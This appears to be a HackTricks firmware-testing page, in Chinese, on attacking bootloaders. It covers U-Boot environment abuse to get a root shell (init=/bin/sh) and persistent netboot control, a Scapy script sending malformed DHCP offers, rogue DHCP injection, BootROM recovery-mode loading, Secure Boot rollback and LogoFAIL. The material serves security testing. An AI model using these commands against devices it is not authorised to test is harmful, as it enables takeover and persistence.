# 引导加载程序测试

{{#include ../../banners/hacktricks-training.md}}

下面的步骤推荐用于修改设备启动配置并测试像 U-Boot 和 UEFI 类加载器的 bootloader。重点是尽早获得代码执行、评估签名/回滚保护，并滥用 recovery 或 network-boot 路径。

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 快速收效与环境滥用

1. 访问解释器 shell
- 在启动过程中，在 `bootcmd` 执行前按已知的中断键（通常是任意键、0、空格或板级特定的“magic”序列）以进入 U-Boot 提示符。

2. 检查启动状态和变量
- 有用的命令：
- `printenv` (转储环境)
- `bdinfo` (板信息、内存地址)
- `help bootm; help booti; help bootz` (支持的内核启动方法)
- `help ext4load; help fatload; help tftpboot` (可用的加载器)

3. 修改 boot 参数以获得 root shell
- 在 kernel 参数追加 `init=/bin/sh`，让内核在正常 init 前降到 shell：
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. 从你的 TFTP 服务器进行 Netboot
- 配置网络并从 LAN 获取 kernel/fit 镜像：
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 通过 environment 持久化更改
- 如果 env 存储未被写保护，你可以持久化控制：
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- 检查诸如 `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` 等变量，这些会影响回退路径。配置错误的值可能让你反复进入 shell。

6. 检查调试/不安全特性
- 查找：`bootdelay` > 0、`autoboot` 被禁用、无限制的 `usb start; fatload usb 0:1 ...`、通过串口的 `loady`/`loads` 能力、从不可信介质 `env import`、以及在未做签名检查的情况下加载的 kernel/ramdisk。

7. U-Boot 镜像/验证测试
- 如果平台声称对 FIT images 做 secure/verified boot，尝试 unsigned 或被篡改的镜像：
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 或传统的 `verify=n` 行为通常允许引导任意 payload。

## Network-boot 面攻击面 (DHCP/PXE) 与 恶意服务器

8. PXE/DHCP 参数模糊测试
- U-Boot 的 legacy BOOTP/DHCP 处理曾存在内存安全问题。例如，CVE‑2024‑42040 描述了通过精心构造的 DHCP 响应导致的内存泄露（leak），可以将 U-Boot 内存的字节泄露回网线。针对 netboot 的 DHCP/PXE 代码路径使用过长/边缘值参数（option 67 bootfile-name、vendor options、file/servername 字段）进行测试，观察是否出现 hang/泄露。
- 最小的 Scapy 片段用于在 netboot 期间施压启动参数：
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 还要验证当链到 OS 端的配置脚本时，PXE 文件名字段是否在没有清理的情况下传递给 shell/loader 逻辑。

9. 恶意 DHCP 服务器命令注入测试
- 搭建一个恶意 DHCP/PXE 服务，尝试在 filename 或 options 字段注入字符，以在启动链的后续阶段到达命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq`，或自定义 Scapy 脚本都适用。先隔离好实验室网络。

## 覆盖正常启动的 SoC ROM 恢复模式

许多 SoC 暴露一个 BootROM “loader” 模式，即使 flash 映像无效也会接受通过 USB/UART 传输的代码。如果 secure-boot fuses 未烧录，这通常能在链中非常早的阶段提供任意代码执行。

- NXP i.MX (Serial Download Mode)
- 工具：`uuu` (mfgtools3) 或 `imx-usb-loader`。
- 示例：`imx-usb-loader u-boot.imx` 将自定义 U-Boot 推入并在 RAM 中运行。
- Allwinner (FEL)
- 工具：`sunxi-fel`。
- 示例：`sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 或 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`。
- Rockchip (MaskROM)
- 工具：`rkdeveloptool`。
- 示例：`rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` 用于阶段性加载器并上传自定义 U-Boot。

评估设备是否已经烧录了 secure-boot eFuses/OTP。如果没有，BootROM download 模式通常绕过任何更高层的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC 类 bootloaders：快速检查

10. ESP 篡改与回滚测试
- 挂载 EFI System Partition (ESP) 并检查加载器组件：`EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, 厂商 logo 路径。
- 如果 Secure Boot 的撤销（dbx）未更新，尝试使用降级或已知存在漏洞的已签名启动组件。如果平台仍信任旧的 shims/bootmanagers，通常可以从 ESP 加载你自己的 kernel 或 `grub.cfg` 来获得持久化。

11. 启动 logo 解析漏洞 (LogoFAIL 类)
- 多家 OEM/IBV 的固件在处理启动 logo 的 DXE 阶段存在图像解析缺陷。如果攻击者能在 ESP 的厂商特定路径（例如 `\EFI\<vendor>\logo\*.bmp`）放置精心构造的图像并重启，可能即便启用了 Secure Boot 也能在早期引导时实现代码执行。测试平台是否接受用户提供的 logo 以及这些路径是否可从 OS 写入。

## 硬件注意事项

在早期启动期间操作 SPI/NAND flash（例如，通过接地引脚来绕过读取）时要小心，并始终查阅 flash 的 datasheet。时序不当的短接可能会损坏设备或编程器。

## 备注和额外提示

- 尝试 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 与存储之间移动环境 blob；一些平台允许从可移动介质导入 env 而无需认证。
- 对于通过 `extlinux.conf` 启动的 Linux 系统，在引导分区修改 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）通常足够，前提是没有签名检查。
- 如果用户态提供 `fw_printenv/fw_setenv`，验证 `/etc/fw_env.config` 是否与实际的 env 存储匹配。配置错误的偏移会让你读/写到错误的 MTD 区域。

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
